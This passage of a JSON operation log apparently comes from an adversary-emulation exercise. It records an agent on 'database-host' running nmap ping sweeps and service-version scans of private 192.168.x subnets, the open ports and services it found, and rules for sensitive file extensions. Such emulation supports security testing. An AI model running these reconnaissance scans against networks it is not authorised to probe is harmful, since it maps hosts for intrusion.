"paw": "tvtjgt", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:21:15Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "b05e5c86-e4e0-4d5a-a972-daed017342e5", "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.201.1", "192.168.201.2", "192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.1', '192.168.201.2', '192.168.201.3']", "created": "2023-10-03T20:21:22Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:21:15Z"}, {"deadman": false, "finish": "2023-10-03T20:22:09Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "6f32ec22-51a1-4274-9e0c-6091b6e27369", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5,6,7", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3,4,5,6,7", "unique": "scan.remote.addr192.168.200.3,4,5,6,7", "created": "2023-10-03T20:21:22Z", "relationships": []}], "unique": "6f32ec22-51a1-4274-9e0c-6091b6e27369", "decide": "2023-10-03T20:21:22Z", "status": 0, "score": 1, "pid": "1508", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720eaa440>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720eab1f0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720cfd450>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720acf490>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720ca62c0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7209432b0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720c65720>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720bc1720>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720bc11b0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720bc3700>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720b583a0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720b5a7d0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720b587c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720b59480>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720bdd060>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d7580>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d5210>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d48e0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:22:09Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:22:09Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d4a90>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208d4fa0>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:21:23Z", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5,6,7", "facts": [{"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-03T20:19:11Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:21:23Z"}, {"deadman": false, "finish": "2023-10-03T20:22:30Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "cc7f9fa6-f992-4733-bcd2-58256bdd2a55", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.1,2,3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 3, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.1,2,3", "unique": "scan.remote.addr192.168.201.1,2,3", "created": "2023-10-03T20:22:12Z", "relationships": []}], "unique": "cc7f9fa6-f992-4733-bcd2-58256bdd2a55", "decide": "2023-10-03T20:22:12Z", "status": 0, "score": 1, "pid": "1511", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-03T20:22:30Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:22:30Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720b686d0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe720700eb0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-03T20:22:30Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:22:30Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720703940>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe720703e20>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tvtjgt", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:22:14Z", "command": "nmap -sV --version-light -oX - 192.168.201.1,2,3", "facts": [{"trait": "host.remote.ip", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.port_services", "links": ["910b2a40-9dd7-4e97-8a8a-8ce389ab5933", "cc7f9fa6-f992-4733-bcd2-58256bdd2a55"], "collected_by": ["sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-03T20:20:16Z", "relationships": ["host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:22:14Z"}], "name": "Enterprise Operation", "id": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "group": "", "jitter": "2/8", "source": {"adjustments": [], "rules": [{"match": ".*", "trait": "file.sensitive.extension", "action": "DENY"}, {"match": "png", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "yml", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "wav", "trait": "file.sensitive.extension", "action": "ALLOW"}], "name": "basic", "id": 